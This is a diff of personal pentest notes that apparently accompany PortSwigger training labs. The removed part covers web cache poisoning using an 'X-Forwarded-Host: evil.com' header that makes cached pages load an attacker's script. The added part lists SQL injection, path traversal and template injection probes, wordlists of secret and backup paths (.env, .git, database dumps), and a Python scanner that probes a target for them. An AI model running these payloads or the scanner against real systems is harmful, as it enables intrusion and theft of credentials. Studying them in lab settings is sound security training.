@@ -1,108 +1,90 @@
-# Web Cache Poisoning - Payload Reference
+# Information Disclosure - Attack Techniques
 
-## Basic Cache Poisoning
+## PortSwigger Lab Solutions
 
-### Unkeyed Header Injection
+### Lab 1: Information disclosure in error messages
+**Status**: SOLVED (Lab #33)
+**Find**: Apache Struts version in error page
 ```
-# Test which headers are NOT part of cache key
-GET / HTTP/1.1
-Host: target.com
-X-Forwarded-Host: evil.com    # If reflected and cached = cache poisoning
-
-# If X-Forwarded-Host is reflected in response (e.g., in script src):
-# <script src="https://evil.com/resources/script.js">
-# This response gets cached, all users get the malicious script
+Apache Struts 2.3.31
 ```
 
-### Common Unkeyed Headers
-```
-X-Forwarded-Host
-X-Forwarded-Port
-X-Forwarded-Scheme
-X-Original-URL
-X-Rewrite-URL
-X-Host
-X-Real-IP
-```
+### Lab 2: Info disclosure in backup files
+**Status**: SOLVED (Lab #34)
+**Find**: /backup containing database credentials
 
-## Detection Steps
+## Common Information Disclosure
 
-1. Send request with `X-Forwarded-Host: evil.com`
-2. Check if response contains `evil.com` in:
-   - Script sources
-   - Link hrefs
-   - Form actions
-   - Redirect URLs
-3. Send same request WITHOUT the header
-4. If response now contains `evil.com` = cache poisoned
-
-## PortSwigger Lab Approach
+### Error Messages
 ```
-1. GET / with X-Forwarded-Host: exploit-server.net
-2. Check response for exploit-server.net in script/link
-3. Send same request without header → verify cached response
-4. Visit / in browser → should load attacker's script
+# Trigger errors to reveal info
+' OR 1=1 --  (SQL error reveals DB type)
+../../etc/passwd (path traversal)
+{{7*7}} (SSTI)
 ```
 
-## Cache Key Behavior
+### Backup Files
 ```
-# Keyed (varies cache): Host, path, method
-# Unkeyed (shared cache): X-Forwarded-*, custom headers
-
-# If unkeyed header affects response AND response is cached:
-# Cache poisoning possible
-```
-
----
-
-# Information Disclosure - Payload Reference
-
-## Error Message Disclosure
-```
-# Trigger errors to leak version/framework info
-GET /nonexistent-page         → 404 with server version
-POST /api with invalid JSON   → Parser error with framework version
-GET /admin                    → 403 with internal path disclosure
-```
-
-## Backup File Discovery
-```
-# Common backup extensions
-/index.php.bak
-/index.php.old
-/index.php.orig
-/index.php.copy
-/index.php~
-/index.php.swp
-/web.config.bak
-/.git/config
-/.env
+/backup
 /backup.sql
+/backup.zip
 /database.sql
+/db_backup.tar.gz
+/.git
+/.env
+/config.php.bak
 ```
 
-## Version Disclosure
+### Debug Endpoints
 ```
-# Server headers
+/debug
+/debug/vars
+/debug/pprof
+/server-status
+/server-info
+/phpinfo.php
+/info.php
+/test.php
+```
+
+### API Documentation
+```
+/swagger-ui.html
+/swagger/v1/swagger.json
+/api-docs
+/openapi.json
+```
+
+### Source Code
+```
+/.git/config
+/.git/HEAD
+/.svn/entries
+/.DS_Store
+/robots.txt
+/sitemap.xml
+```
+
+### Server Headers
+```
 Server: Apache/2.4.41
 X-Powered-By: PHP/7.4.3
-
-# Error pages
-# Detailed stack traces
-# Debug mode enabled
 ```
 
-## Source Code Disclosure
-```
-# .git directory exposure
-GET /.git/HEAD
-GET /.git/config
+## Detection Script
+```python
+import requests
 
-# Source maps
-GET /main.js.map
+paths = [
+    "/robots.txt", "/sitemap.xml", "/.git/HEAD",
+    "/backup", "/database.sql", "/.env",
+    "/debug", "/phpinfo.php", "/server-status",
+    "/swagger-ui.html", "/api-docs",
+]
 
-# Configuration files
-GET /.env
-GET /config.php
-GET /wp-config.php
+target = "https://TARGET"
+for path in paths:
+    r = requests.get(target + path)
+    if r.status_code == 200 and len(r.text) > 100:
+        print(f"[!] Found: {path} ({len(r.text)} bytes)")
 ```
